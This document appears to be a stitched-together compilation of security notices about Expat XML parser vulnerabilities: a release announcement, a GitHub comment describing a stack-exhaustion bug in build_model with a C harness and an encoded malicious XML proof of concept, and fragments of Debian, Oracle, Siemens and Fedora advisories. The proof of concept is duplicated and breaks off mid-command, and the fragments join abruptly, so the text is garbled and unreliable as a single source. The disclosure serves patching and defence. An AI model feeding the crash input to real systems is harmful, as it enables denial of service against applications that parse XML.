Subject: Expat 2.4.5 released, includes 5 security fixes

 From <https://blog.hartwork.org/posts/expat-2-4-5-released/> :

> Expat 2.4.5 released, includes security fixes
> 2022-02-19 01:23
>
> libexpat is a fast streaming XML parser. Alongside libxml2, Expat is one of the most widely used software libre XML parsers written in C, precisely C99. It is cross-platform and licensed under the MIT license.
>
> Expat 2.4.5 has been released a few hours ago. This release is about security fixes. There are 5 CVEs involved:
>
>     CVE-2022-25235
>     CVE-2022-25236
>     CVE-2022-25313
>     CVE-2022-25314
>     CVE-2022-25315
>
> Regarding impact of vulnerabilities, please note that looking at a vulnerability in isolation may miss part of the picture; e.g. if Expat passes malformed data to the application using Expat and that application isn't prepared for Expat violating their agreed API contract, you may end up with code execution from something that looked close to harmless, in isolation.
>
> For more details, please check out the change log.
>
> If you maintain Expat packaging or a bundled copy of Expat or a pinned version of Expat somewhere, please update to 2.4.5. Thank you!

### @ferivoz **[ferivoz](/ferivoz)** commented [Feb 15, 2022](#issue-1138613076)

It is possible to trigger stack exhaustion in build\_model function if

depth of nested children in DTD element is large enough. This happens

because build\_node is a recursively called function within build\_model.

The code has been adjusted to run iteratively. It uses the already

allocated heap space as temporary stack (growing from top to bottom).

Output is identical to recursive version. No new fields in data

structures were added, i.e. it keeps full API and ABI compatibility.

Instead the numchildren variable is used to temporarily keep the

index of items (uint vs int).

Documentation and readability improvements kindly added by Sebastian.

Proof of Concept:

1. Compile poc binary which parses XML file line by line

```
cat > poc.c << EOF
 #include <err.h>
 #include <expat.h>
 #include <stdio.h>

 XML_Parser parser;

 static void XMLCALL
 dummy_element_decl_handler(void *userData, const XML_Char *name,
                            XML_Content *model) {
   XML_FreeContentModel(parser, model);
 }

 int main(int argc, char *argv[]) {
   FILE *fp;
   char *p = NULL;
   size_t s = 0;
   ssize_t l;
   if (argc != 2)
     errx(1, "usage: poc poc.xml");
   if ((parser = XML_ParserCreate(NULL)) == NULL)
     errx(1, "XML_ParserCreate");
   XML_SetElementDeclHandler(parser, dummy_element_decl_handler);
   if ((fp = fopen(argv[1], "r")) == NULL)
     err(1, "fopen");
   while ((l = getline(&p, &s, fp)) > 0)
     if (XML_Parse(parser, p, (int)l, XML_FALSE) != XML_STATUS_OK)
       errx(1, "XML_Parse");
   XML_ParserFree(parser);
   free(p);
   fclose(fp);
   return 0;
 }
EOF
cc -std=c11 -D_POSIX_C_SOURCE=200809L -lexpat -o poc poc.c

```

2. Create XML file with a lot of nested groups in DTD element

```
cat > poc.xml.zst.b64 << EOF
KLUv/aQkACAAPAEA+DwhRE9DVFlQRSB1d3UgWwo8IUVMRU1FTlQgdXd1CigBAHv/58AJAgAQKAIA
ECgCABAoAgAQKAIAECgCABAoAgAQKHwAAChvd28KKQIA2/8gV24XBAIAECkCABApAgAQKQIAECkC
ABApAgAQKQIAEClVAAAgPl0+CgEA4A4I2VwwnQ==
EOF
base64 -d poc.xml.zst.b64 | zstd -d > poc.xml

```

3. Run Proof of Concept

```
./poc poc.xml

```

```
It is possible to trigger stack exhaustion in build_model function if
depth of nested children in DTD element is large enough. This happens
because build_node is a recursively called function within build_model.

The code has been adjusted to run iteratively. It uses the already
allocated heap space as temporary stack (growing from top to bottom).

Output is identical to recursive version. No new fields in data
structures were added, i.e. it keeps full API and ABI compatibility.
Instead the numchildren variable is used to temporarily keep the
index of items (uint vs int).

Documentation and readability improvements kindly added by Sebastian.

Proof of Concept:

1. Compile poc binary which parses XML file line by line

```
cat > poc.c << EOF
 #include <err.h>
 #include <expat.h>
 #include <stdio.h>

 XML_Parser parser;

 static void XMLCALL
 dummy_element_decl_handler(void *userData, const XML_Char *name,
                            XML_Content *model) {
   XML_FreeContentModel(parser, model);
 }

 int main(int argc, char *argv[]) {
   FILE *fp;
   char *p = NULL;
   size_t s = 0;
   ssize_t l;
   if (argc != 2)
     errx(1, "usage: poc poc.xml");
   if ((parser = XML_ParserCreate(NULL)) == NULL)
     errx(1, "XML_ParserCreate");
   XML_SetElementDeclHandler(parser, dummy_element_decl_handler);
   if ((fp = fopen(argv[1], "r")) == NULL)
     err(1, "fopen");
   while ((l = getline(&p, &s, fp)) > 0)
     if (XML_Parse(parser, p, (int)l, XML_FALSE) != XML_STATUS_OK)
       errx(1, "XML_Parse");
   XML_ParserFree(parser);
   free(p);
   fclose(fp);
   return 0;
 }
EOF
cc -std=c11 -D_POSIX_C_SOURCE=200809L -lexpat -o poc poc.c
```

2. Create XML file with a lot of nested groups in DTD element

```
cat > poc.xml.zst.b64 << EOF

Debian Bug     : 1005894 1005895

Several vulnerabilities have been discovered in Expat, an XML parsing C
library, which could result in denial of service or potentially the
execution of arbitrary code, if a malformed XML file is processed.

For the oldstable distribution (buster), these problems have been fixed
in version 2.2.6-2+deb10u3.

For the stable distribution (bullseye), these problems have been fixed in
version 2.2.10-2+deb11u2.

We recommend that you upgrade your expat packages.

For the detailed security status of expat please refer to its security
tracker page at:
<https://security-tracker.debian.org/tracker/expat>

## Oracle Critical Patch Update Advisory - April 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 520 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2857016.1).

#### Note:

* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

#### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 54 new security patches plus additional third party patches noted below for Oracle Fusion Middleware.  41 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#FMW)

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update April 2022 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2853458.2](https://support.oracle.com/rs?type=doc&id=2853458.2).

PRODUCT DESCRIPTION

SINEMA Remote Connect is a management platform for remote networks that enables the simple
management of tunnel connections (VPN) between headquarters, service technicians, and installed
machines or plants. It provides both the Remote Connect Server, which is the server application, and the
Remote Connect Client, which is an OpenVPN client for optimal connection to SINEMA Remote Connect
Server.

VULNERABILITY DESCRIPTION

This chapter describes all vulnerabilities (CVE-IDs) addressed in this security advisory. Wherever
applicable, it also documents the product-specific impact of the individual vulnerabilities.

Vulnerability CVE-2021-22924

libcurl keeps previously used connections in a connection pool for subsequent transfers to reuse, if
one of them matches the setup. Due to errors in the logic, the config matching function did not take
‘issuercert’ into account and it compared the involved paths case insensitively, which could lead to
libcurl reusing wrong connections. File paths are, or can be, case sensitive on many systems but not all,
and can even vary depending on used file systems. The comparison also didn’t include the ‘issuer cert’
which a transfer can set to qualify how to verify the server certificate.

Vulnerability CVE-2021-22925

curl supports the -t command line option, known as CURLOPT_TELNETOPTIONS in libcurl. This rarely
used option is used to send variable=content pairs to TELNET servers. Due to flaw in the option parser
for sending NEW_ENV variables, libcurl could be made to pass on uninitialized data from a stack based
buffer to the server. Therefore potentially revealing sensitive internal information to the server using
a clear-text network protocol. This could happen because curl did not call and use sscanf() correctly
when parsing the string provided by the application.

Fedora Update Notification
FEDORA-2022-04f206996b
2022-03-01 18:34:51.146363
--------------------------------------------------------------------------------

Name : mingw-expat
Product : Fedora 34
Version : 2.4.6
Release : 1.fc34
URL : <http://www.libexpat.org/>
Summary : MinGW Windows port of expat XML parser library
Description :
This is expat, the C library for parsing XML, written by James Clark. Expat
is a stream oriented XML parser. This means that you register handlers with
the parser prior to starting the parse. These handlers are called when the
parser discovers the associated structures in the document being parsed. A
start tag is an example of the kind of structures for which you may
register handlers.

--------------------------------------------------------------------------------
Update Information:

Update to expat-2.4.6, see
<https://github.com/libexpat/libexpat/blob/R_2_4_6/expat/Changes> for details.

Fedora Update Notification
FEDORA-2022-3d9d67f558
2022-03-01 18:17:25.167212
--------------------------------------------------------------------------------

Name : mingw-expat
Product : Fedora 35
Version : 2.4.6
Release : 1.fc35
URL : <http://www.libexpat.org/>
Summary : MinGW Windows port of expat XML parser library
Description :
This is expat, the C library for parsing XML, written by James Clark. Expat
is a stream oriented XML parser. This means that you register handlers with
the parser prior to starting the parse. These handlers are called when the
parser discovers the associated structures in the document being parsed. A
start tag is an example of the kind of structures for which you may
register handlers.

--------------------------------------------------------------------------------
Update Information:

Update to expat-2.4.6, see
<https://github.com/libexpat/libexpat/blob/R_2_4_6/expat/Changes> for details.
